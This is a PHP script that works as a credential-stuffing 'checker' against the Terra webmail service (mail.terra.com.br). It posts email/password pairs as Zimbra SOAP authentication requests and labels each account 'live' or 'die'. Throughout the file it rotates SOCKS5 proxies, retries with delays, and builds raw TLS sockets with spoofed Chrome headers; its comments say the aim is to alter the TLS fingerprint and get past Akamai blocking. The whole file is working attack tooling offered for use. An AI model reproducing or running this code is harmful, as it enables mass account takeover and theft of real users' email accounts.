<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'diag_check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    $diag = array('email' => $email, 'methods' => array());

    $diag['methods']['socks5_soap_443'] = diagSocks5Soap($email, $password, $proxy, 25);

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = ''; $port = 0; $user = ''; $pass = ''; $type = 'http';
    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';
    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }
    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

function buildSoapRequest($email, $password) {
    $safe_email = htmlspecialchars($email, ENT_XML1);
    $safe_pass = htmlspecialchars($password, ENT_XML1);
    return '<?xml version="1.0" encoding="UTF-8"?>' .
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
        '<soap:Body>' .
        '<AuthRequest xmlns="urn:zimbraAccount">' .
        '<account by="name">' . $safe_email . '</account>' .
        '<password>' . $safe_pass . '</password>' .
        '</AuthRequest>' .
        '</soap:Body>' .
        '</soap:Envelope>';
}

function parseZimbraResult($body, $code, $email) {
    if (empty($body)) return null;
    $lower = strtolower($body);

    if ($code === 403 || $code === 401) return null;
    if (strpos($lower, '<html') !== false) return null;
    if (strpos($lower, 'access denied') !== false) return null;
    if (strpos($lower, 'akamai') !== false) return null;
    if (strpos($lower, 'edgesuite') !== false) return null;

    if (strpos($lower, 'authtoken') !== false && strpos($lower, 'soap:fault') === false) {
        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    }

    if (strpos($lower, 'soap:fault') !== false || strpos($lower, 'faultcode') !== false) {
        if (strpos($lower, 'auth') !== false || strpos($lower, 'password') !== false || strpos($lower, 'account') !== false) {
            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
        }
        return null;
    }

    return null;
}

// =========================================
//  SOCKS5 BINARIO -> TLS PHP -> HTTP/1.1 POST -> SOAP
//  Fingerprint TLS diferente do cURL
//  HTTP/1.1 em vez de HTTP/2 (cURL usa HTTP/2)
// =========================================

function socks5Tunnel($p, $targetHost, $targetPort, $timeout) {
    // 1. TCP ao proxy SOCKS5
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return false;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // 2. SOCKS5 greeting - oferecer no-auth (0x00) e user/pass (0x02)
    fwrite($socket, chr(5) . chr(2) . chr(0) . chr(2));
    $greeting = @fread($socket, 2);
    if (strlen($greeting) < 2) { fclose($socket); return false; }
    $method = ord($greeting[1]);

    // 3. Autenticar se solicitado
    if ($method === 2) {
        $user = $p['user'];
        $pass = $p['pass'];
        $auth = chr(1) . chr(strlen($user)) . $user . chr(strlen($pass)) . $pass;
        fwrite($socket, $auth);
        $authResp = @fread($socket, 2);
        if (strlen($authResp) < 2 || ord($authResp[1]) !== 0) { fclose($socket); return false; }
    } elseif ($method !== 0) {
        fclose($socket); return false;
    }

    // 4. SOCKS5 CONNECT para targetHost:targetPort
    $connectReq = chr(5) . chr(1) . chr(0) . chr(3) . chr(strlen($targetHost)) . $targetHost . pack('n', $targetPort);
    fwrite($socket, $connectReq);

    // 5. Ler resposta (minimo 10 bytes)
    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (strlen($resp) < 10 && !feof($socket) && microtime(true) < $deadline) {
        $chunk = @fread($socket, 10 - strlen($resp));
        if ($chunk === false || $chunk === '') { usleep(100000); continue; }
        $resp .= $chunk;
    }

    // Verificar se o tunnel foi estabelecido (REP = 0x00 = success)
    if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return false; }

    return $socket;
}

function enableTLS($socket, $timeout) {
    $deadline = microtime(true) + $timeout;
    while (microtime(true) < $deadline) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) return true;
        if ($r === false) return false;
        usleep(100000);
    }
    return false;
}

function readHttpResponse($socket, $timeout) {
    $raw = '';
    $deadline = microtime(true) + $timeout;
    $headersDone = false;
    $body = '';
    $contentLength = 0;
    $chunked = false;

    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $raw .= $line;

        if (!$headersDone) {
            if (preg_match('/Content-Length:\s*(\d+)/i', $line, $cm)) {
                $contentLength = (int)$cm[1];
            }
            if (preg_match('/Transfer-Encoding:\s*chunked/i', $line)) {
                $chunked = true;
            }
            if ($line === CRLF || $line === LF) {
                $headersDone = true;
            }
        } else {
            $body .= $line;
            if (!$chunked && $contentLength > 0 && strlen($body) >= $contentLength) break;
            if ($chunked && strpos($line, '0' . CRLF) === 0) break;
        }
    }

    $code = 0;
    if (preg_match('/HTTP\/[\d.]+\s+(\d+)/', $raw, $sm)) {
        $code = (int)$sm[1];
    }

    // De-chunk se necessario
    if ($chunked && !empty($body)) {
        $body = decodeChunked($body);
    }

    return array('code' => $code, 'body' => $body, 'raw' => $raw);
}

function decodeChunked($data) {
    $result = '';
    $pos = 0;
    while ($pos < strlen($data)) {
        $crlfPos = strpos($data, CRLF, $pos);
        if ($crlfPos === false) break;
        $sizeHex = substr($data, $pos, $crlfPos - $pos);
        $size = hexdec(trim($sizeHex));
        if ($size === 0) break;
        $pos = $crlfPos + 2;
        $result .= substr($data, $pos, $size);
        $pos += $size + 2;
    }
    return $result;
}

function trySocks5Soap($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;
    if ($p['type'] !== 'socks5') return null;

    // 1. SOCKS5 tunnel para mail.terra.com.br:443 (porta 443 = permitida!)
    $socket = socks5Tunnel($p, 'mail.terra.com.br', 443, $timeout);
    if ($socket === false) return null;

    // 2. TLS via PHP (fingerprint diferente do cURL)
    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }

    // 3. HTTP/1.1 POST com SOAP XML + headers de navegador real
    $soapXml = buildSoapRequest($email, $password);
    $httpReq = 'POST /service/soap/ HTTP/1.1' . CRLF;
    $httpReq .= 'Host: mail.terra.com.br' . CRLF;
    $httpReq .= 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' . CRLF;
    $httpReq .= 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' . CRLF;
    $httpReq .= 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' . CRLF;
    $httpReq .= 'Accept-Encoding: identity' . CRLF;
    $httpReq .= 'Content-Type: application/soap+xml; charset=utf-8' . CRLF;
    $httpReq .= 'Content-Length: ' . strlen($soapXml) . CRLF;
    $httpReq .= 'Connection: close' . CRLF;
    $httpReq .= 'Origin: https://mail.terra.com.br' . CRLF;
    $httpReq .= 'Referer: https://mail.terra.com.br/' . CRLF;
    $httpReq .= 'sec-ch-ua: ' . DQ . 'Chromium' . DQ . ';v=' . DQ . '131' . DQ . ', ' . DQ . 'Not_A Brand' . DQ . ';v=' . DQ . '24' . DQ . CRLF;
    $httpReq .= 'sec-ch-ua-mobile: ?0' . CRLF;
    $httpReq .= 'sec-ch-ua-platform: ' . DQ . 'Windows' . DQ . CRLF;
    $httpReq .= 'sec-fetch-dest: document' . CRLF;
    $httpReq .= 'sec-fetch-mode: navigate' . CRLF;
    $httpReq .= 'sec-fetch-site: same-origin' . CRLF;
    $httpReq .= 'upgrade-insecure-requests: 1' . CRLF;
    $httpReq .= CRLF;
    $httpReq .= $soapXml;

    fwrite($socket, $httpReq);

    // 4. Ler resposta HTTP
    $resp = readHttpResponse($socket, $timeout);
    fclose($socket);

    return parseZimbraResult($resp['body'], $resp['code'], $email);
}

function tryCurlSoapDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $soapXml = buildSoapRequest($email, $password);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/soap+xml; charset=utf-8',
        'Accept: application/soap+xml, text/xml, */*',
    ));

    $result = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return parseZimbraResult($result, $code, $email);
}

function doValidate($email, $password, $proxy) {
    $timeout = 25;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // Metodo 1: SOCKS5 binario -> TLS PHP -> SOAP HTTP/1.1
        if (!empty($proxy)) {
            $r = trySocks5Soap($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // Metodo 2: cURL SOAP direto (sem proxy)
        if (extension_loaded('curl')) {
            $r = tryCurlSoapDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

function diagSocks5Soap($email, $password, $proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) {
        return array('ok' => false, 'err' => 'Parse failed');
    }

    $t0 = microtime(true);

    // Step 1: SOCKS5 tunnel para porta 443
    $socket = socks5Tunnel($p, 'mail.terra.com.br', 443, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'step' => 'socks5_tunnel', 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'SOCKS5 tunnel to 443 failed');
    }

    // Step 2: TLS
    $tls = enableTLS($socket, $timeout);
    if (!$tls) {
        fclose($socket);
        return array('ok' => false, 'step' => 'tls', 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS handshake failed');
    }

    // Step 3: HTTP POST SOAP
    $soapXml = buildSoapRequest($email, $password);
    $httpReq = 'POST /service/soap/ HTTP/1.1' . CRLF;
    $httpReq .= 'Host: mail.terra.com.br' . CRLF;
    $httpReq .= 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' . CRLF;
    $httpReq .= 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' . CRLF;
    $httpReq .= 'Accept-Language: pt-BR,pt;q=0.9' . CRLF;
    $httpReq .= 'Content-Type: application/soap+xml; charset=utf-8' . CRLF;
    $httpReq .= 'Content-Length: ' . strlen($soapXml) . CRLF;
    $httpReq .= 'Connection: close' . CRLF;
    $httpReq .= 'Origin: https://mail.terra.com.br' . CRLF;
    $httpReq .= 'Referer: https://mail.terra.com.br/' . CRLF;
    $httpReq .= CRLF;
    $httpReq .= $soapXml;

    fwrite($socket, $httpReq);

    // Step 4: Ler resposta
    $resp = readHttpResponse($socket, $timeout);
    fclose($socket);

    $timeMs = round((microtime(true) - $t0) * 1000);

    return array(
        'ok' => strlen($resp['body']) > 0 || $resp['code'] > 0,
        'step' => 'complete',
        'http_code' => $resp['code'],
        'time_ms' => $timeMs,
        'body_len' => strlen($resp['body']),
        'response' => substr($resp['body'], 0, 1000),
    );
}
